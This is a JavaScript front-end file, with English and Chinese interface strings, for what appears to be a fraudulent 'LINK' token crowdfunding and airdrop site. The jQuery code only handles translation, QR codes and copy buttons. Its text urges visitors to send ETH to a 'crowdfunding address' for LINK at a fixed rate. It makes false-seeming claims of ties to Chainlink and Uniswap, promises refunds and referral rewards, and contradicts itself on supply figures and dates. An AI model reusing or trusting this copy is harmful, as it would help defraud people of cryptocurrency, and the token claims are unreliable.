"use strict";
var tnum = 'zh_cn';
var language = {
  en_us: 'English',
  de: 'Deutsche',
  fr: 'français',
  sp: 'Español',
  ko: '한국어',
  zh_cn: '简体中文',
  zh_tw: '繁體中文'
};
var trans = {
  en_us: {
    msg_v1: 'The number of crowdfunding cannot be empty',
    msg_v2: 'Please enter a valid ETH address',
    msg_v3: 'Copy successfully',
    msg_v4: 'The airdrop quantity has ended',
    msg_v5: 'Cannot participate in the airdrop repeatedly',
    msg_v6: 'Please revisit the referrer’s address',
    msg_v7: 'Invalid referrer',
    msg_v8: 'Sent successfully',
    msg_v9: 'Airdrop success',
    msg_v10: 'Crowdfunding is over',
    msg_v11: 'The number of crowdfunding cannot be empty',
    msg_v12: 'The number of crowdfunding must be greater than 0',
    copy: 'Copy',
    v1: 'UNI Finance',
    v2: 'Parachutage',
    v3: 'Vaults follow a unique strategy that are designed to maximize the yield of the deposited asset and minimize risk.',
    v4: 'Earn performs profit switching for lending providers, moving your funds between dydx, Aave, Compound autonomously.',
    v5: 'Get cover with Nexus Mutual from yinsure.finance',
    v6: 'LINK is an independent fork of UNI technology. It is a decentralized mobile application of UNI. The platform aggregates multiple protocols. When users deposit, the platform will automatically allocate user funds to the current agreement with the highest revenue, and give users a name In order to prove the rights and interests of LINK Token, users can withdraw their original deposited tokens and corresponding income through LINK Token.',
    v7: 'Participate in the airdrop',
    v8: 'I want to crowdfund',
    v9: 'Please enter the amount of ETH you want to crowdfund',
    v10: 'Crowdfund',
    v11: 'Crowdfunding address',
    v12: 'Balance',
    v13: 'Invited',
    v14: 'Invitation reward',
    v15: 'Use your wallet',
    v16: 'Send ETH to the crowdfunding address.',
    v17: 'Invitation link',
    v18: 'My QR code',
    v19: 'My QR code picture',
    v20: 'Save the QR code',
    v21: 'shut down',
    v22: 'Copy and share your link. You and the invitee will be rewarded with ',
    v22_1: ' LINK at the same time. Each person can invite up to ',
    v22_2: 'people. Each person can get a maximum of ',
    v22_3: ' LINK. If it is recognized as cheating, the reward will be cancelled. If you participate in crowdfunding, a refund will be implemented.',
    v23: 'Crowdfunding instructions',
    v24: 'The total number of LINKI is only 10,000,000. This LINKI drop is 1,000,000. To thank LINK technical team for their technical support, we give 100,000 Links to the official CHAINLINK, 3,000,000 LINK line pledges, and the remaining 59,00000 are mobile mines.',
    v25: "At the beginning of LINK's subscription, tokens will be issued synchronously, and participating users will be air-dropped synchronously. Upon the end of subscription, Uniswap decentralized exchange will be launched and open for trading.",
    v26: 'Crowdfunding rules',
    v27: 'Total crowdfunding: 3,000,000 LINK ',
    v28: 'Crowdfunding price 1 ETH = 1000 LINK crowdfunding time: 2020-09-25 to 2020-10-25 (UTC+8)',
    v29: 'The quota is sorted by time, and tokens are issued, the earlier the participation, the greater the success rate. If the crowdfunding is completed, the purchase will be refunded automatically if the purchase is not successful.',
    v30: 'Recognition method',
    v31: 'Click to participate in crowdfunding and pay the crowdfunding amount to the contract address',
    v32: 'Crowdfunding tokens are distributed to wallets in real time',
    v33: 'Multiple ETH can be transferred, automatically aggregated',
    v34: 'This airdrop enables machine learning to identify cheating. Those who are identified as cheaters will cancel the airdrop, and those who participate in the recognition will return ETH',
    v35: 'Users',
    v36: '1 ETH=1000 LINK total 3,000,000 LINK quotas are sorted by time, and tokens are issued. The earlier the participation, the greater the success rate.',
    v37: 'Record',
    v38: 'Time',
    v39: 'Transfer in',
    v40: 'Acquire',
    v41: 'Airdrop remaining quantity',
    v42: 'Crowdfunding remaining amount',
    v50: 'Rewards for participation: Users can get 10 LINK rewards for participation, and 10 LINK rewards can be obtained again for each user invited to participate.',
    v51: 'Crowdfunding time: 2020-10-06 to 2020-11-06',
    v52: 'Crowd-funding price: 1 ETH = 1000 LINK, 0.001 ETH to start the subscription',
  },
  zh_cn: {
    msg_v1: '众筹数量不能为空',
    msg_v2: '请输入有效的ETH地址',
    msg_v3: '复制成功',
    msg_v4: '空投数量已结束',
    msg_v5: '不能重复参加空投',
    msg_v6: '请重新访问推荐人的地址',
    msg_v7: '无效的推荐人',
    msg_v8: '发送成功',
    msg_v9: '确认成功',
    msg_v10: '众筹结束',
    msg_v11: '众筹数量不能为空',
    msg_v12: '众筹数量必须大于0',
    copy: '复制',
    v1: 'UNI 资产',
    v2: '空投活动',
    v3: '保管库遵循独特的策略，旨在最大程度地提高已存放资产的收益并最大程度地降低风险。',
    v4: 'Earn为贷款提供商执行利润转换，自动在dydx，Aave和Compound之间转移资金。',
    v5: '从yinsure.finance获取NexusMutual的保护。',
    v6: "LINK是经CHAINLINK分叉出来的DeFi权益凭证，是LINK的DeFi应用，平台聚合多个机枪池，用户存款时，平台会将用户资金自动分配至目前收益最高的机枪池，从而为用户获得最大的收益，用户需要通过LINKI取出自己原来存入的代币及相应收益。",
    v7: '参加空投',
    v8: '我要众筹',
    v9: '请输入您要众筹的ETH数量',
    v10: '众筹',
    v11: '众筹地址',
    v12: '余额',
    v13: '已邀请',
    v14: '邀请奖励',
    v15: '使用您的钱包',
    v16: '发送ETH到众筹地址。',
    v17: '邀请链接',
    v18: '我的二维码',
    v19: '我的二维码图片',
    v20: '保存二维码',
    v21: '关闭',
    v22: '复制并分享你的链接，你和被邀请人同时奖励 ',
    v22_1: ' LINK，每人最多可邀请 ',
    v22_2: '人。每人最多获得 ',
    v22_3: ' LINK， 如被识别为作弊， 将取消奖励。如参与众筹，将执行退款。',
    v23: '空投说明',
    v24: 'LINKI总量仅10,000,000枚， 本次LINKI空投数量1,000,000枚，为了感谢LINK技术团队对我们的技术支持，我们将100,000枚LINK赠与CHAINLINK官方，3,000,000枚LINK线上认筹，剩下59000,00枚流动性挖矿。',
    v25: 'LINK开始认筹即同步发放代币，同步对参与用户进行空投，认筹结束即上线Uniswap去中心化交易所开放交易。',
    v26: '众筹规则',
    v27: '众筹总量：3,000,000 LINK',
    v28: '众筹价格 1 ETH = 1000 LINK',
    v29: '额度按照时间排序，开始发放代币, 越早参与成功率越大。如众筹完毕，未能购买成功将原路自动退款',
    v30: '众筹方式',
    v31: '点击参与众筹将众筹金额支付至合约地址即可',
    v32: '众筹代币实时发放至钱包',
    v33: '可转账多笔ETH，自动汇总',
    v34: '本次空投启用机器学习识别作弊， 被识别为作弊者将取消空投，参与认筹的将原路退回 ETH',
    v35: '人',
    v36: '1 ETH=1000 LINK  总量3,000,000 LINK 额度按照时间排序，开始发放代币， 越早参与成功率越大。',
    v37: '认购记录',
    v38: '时间',
    v39: '转入',
    v40: '获得',
    v41: '空投剩余数量',
    v42: '众筹剩余数量',
    v50: '参与奖励：用户参与即可获得10枚LINK奖励，每邀请一名用户参与，可再次获得10枚LINK奖励。',
    v51: '众筹时间：2020-10-06 至 2020-11-06',
    v52: '众筹价格：1 ETH = 1000 LINK，0.001枚ETH即可开启认筹',
  }
};
function translate(tnum) {
  layer.open({
    type: 2,
    shadeClose: false
  });
  $('.cur_language').html(language[tnum]);
  $('.lang').each(function () {
    var params = $(this).attr('data-params');
    var tagName = $(this)[0].tagName.toLowerCase();
    if (tagName === 'i' && params === 'copy') {
      $(this).attr('data-original-title', trans[tnum][params]);
    } else if (tagName === 'input') {
      $(this).attr('placeholder', trans[tnum][params]);
    } else {
      $(this).html(trans[tnum][params]);
    }
  });
  setTimeout(function () {
    layer.closeAll();
  }, 1500)
}
$(document).ready(function () {
  var l = (navigator.browserLanguage || navigator.language).toLowerCase();
  if (l.indexOf('zh') !== -1) {
    tnum = 'zh_cn';
  } else {
    tnum = 'en_us';
  }

  tnum = $.cookie('lang') ? $.cookie('lang') : tnum;
  translate(tnum);
  $('.lang-menu a').click(function (e) {
    e.preventDefault();
    tnum = $(this).attr('data-params');
    $.cookie('lang', tnum);
    translate(tnum);
  });
  $('.navbar-main .collapse').on('hide.bs.collapse', function () {
    var $this = $(this);
    $this.addClass('collapsing-out');
  });
  $('.navbar-main .collapse').on('hidden.bs.collapse', function () {
    var $this = $(this);
    $this.removeClass('collapsing-out');
  });
  $('.navbar-main .dropdown').on('hide.bs.dropdown', function () {
    var $this = $(this).find('.dropdown-menu');
    $this.addClass('close');
    setTimeout(function () {
      $this.removeClass('close');
    }, 200);
  });
  if ($('.headroom')[0]) {
    var headroom = new Headroom(document.querySelector("#navbar-main"), {
      offset: 150,
      tolerance: {
        up: 30,
        down: 30
      },
    });
    headroom.init();
  }
  $('.datepicker')[0] && $('.datepicker').each(function () {
    $('.datepicker').datepicker({
      disableTouchKeyboard: true,
      autoclose: false
    });
  });
  $('[data-toggle="tooltip"]').tooltip();
  $('[data-toggle="popover"]').each(function () {
    var popoverClass = '';
    if ($(this).data('color')) {
      popoverClass = 'popover-' + $(this).data('color');
    }
    $(this).popover({
      trigger: 'focus',
      template: '<div class="popover ' + popoverClass + '" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>'
    })
  });
  $('.form-control').on('focus blur', function (e) {
    $(this).parents('.form-group').toggleClass('focused', (e.type === 'focus' || this.value.length > 0));
  }).trigger('blur');
  if ($(".input-slider-container")[0]) {
    $('.input-slider-container').each(function () {
      var slider = $(this).find('.input-slider');
      var sliderId = slider.attr('id');
      var minValue = slider.data('range-value-min');
      var maxValue = slider.data('range-value-max');
      var sliderValue = $(this).find('.range-slider-value');
      var sliderValueId = sliderValue.attr('id');
      var startValue = sliderValue.data('range-value-low');
      var c = document.getElementById(sliderId)
        , d = document.getElementById(sliderValueId);
      noUiSlider.create(c, {
        start: [parseInt(startValue)],
        connect: [true, false],
        range: {
          'min': [parseInt(minValue)],
          'max': [parseInt(maxValue)]
        }
      });
      c.noUiSlider.on('update', function (a, b) {
        d.textContent = a[b];
      });
    })
  }
  if ($("#input-slider-range")[0]) {
    var c = document.getElementById("input-slider-range")
      , d = document.getElementById("input-slider-range-value-low")
      , e = document.getElementById("input-slider-range-value-high")
      , f = [d, e];
    noUiSlider.create(c, {
      start: [parseInt(d.getAttribute('data-range-value-low')), parseInt(e.getAttribute('data-range-value-high'))],
      connect: !0,
      range: {
        min: parseInt(c.getAttribute('data-range-value-min')),
        max: parseInt(c.getAttribute('data-range-value-max'))
      }
    }),
      c.noUiSlider.on("update", function (a, b) {
        f[b].textContent = a[b]
      })
  }
  $('[data-toggle="on-screen"]')[0] && $('[data-toggle="on-screen"]').onScreen({
    container: window,
    direction: 'vertical',
    doIn: function () { },
    doOut: function () { },
    tolerance: 200,
    throttle: 50,
    toggleClass: 'on-screen',
    debug: false
  });
  // $('[data-toggle="scroll"]').on('click', function (event) {
  //   var hash = $(this).attr('href');
  //   var offset = $(this).data('offset') ? $(this).data('offset') : 0;
  //   $('html, body').stop(true, true).animate({
  //     scrollTop: $(hash).offset().top - offset
  //   }, 600);
  //   event.preventDefault();
  // });
  var qrcode = $('input[name=qrcode]').val();
  if (qrcode) {
    $('#qrcode').qrcode({
      width: 256,
      height: 256,
      text: qrcode
    });
  }
  // var address = null;
  // $('button.join-btn').on('click', function () {
  //   address = $('.address').val().trim();
  //   if (address === '') {
  //     $('.alert .text').text(trans[tnum]['msg_v1']);
  //     $('.alert').addClass('show');
  //   } else if (address.length > 1 && address.substr(0, 2) !== '0x' || address.length !== 42) {
  //     $('.alert .text').text(trans[tnum]['msg_v2']);
  //     $('.alert').addClass('show');
  //   } else {
  //     layer.open({
  //       type: 2,
  //       shadeClose: false
  //     });
  //     var dre = $('input[name=dre]').val();

  //     $.post('/Home/Index/save?' + Math.random(), {
  //       address: address,
  //       dre: dre
  //     }, function (res) {
  //       layer.closeAll();
  //       if (res.status === 1) {
  //         $('.user-address').text(res.data.address);
  //         $('.balance').text(res.data.eth);
  //         $('.members').text(res.data.rec_count);
  //         $('.invbonus').text(res.data.rec_eth);
  //         var url = window.location.protocol + "//" + window.location.host + '/?dre=' + res.data.dre;
  //         $('#qrcode').qrcode(url);
  //         $('#share_url').html(url);
  //         $('#share_url_copy').attr('data-text', url);
  //         $('.address-panel').hide();
  //         $('.share-panel').show();
  //       } else {
  //         alert(res.info);
  //       }
  //     });
  //   }
  // });
  $('.address').on("input", function () {
    if ($(this).val().trim() !== '') {
      $('.alert').removeClass('show');
    }
  });
  $('#save_qrcode').click(function () {
    var canvas = $("#qrcode").children('canvas')[0];
    var dom = document.createElement("a");
    dom.href = canvas.toDataURL("image/png");
    dom.download = new Date().getTime() + ".png";
    dom.click();
  });
  var clipboard = new Clipboard('.copy-text');
  clipboard.on('success', function (e) {
    layer.open({
      content: trans[tnum]['msg_v3'],
      skin: 'msg',
      time: 3
    });
    e.clearSelection();
  });
  clipboard.on('error', function (e) { });
});
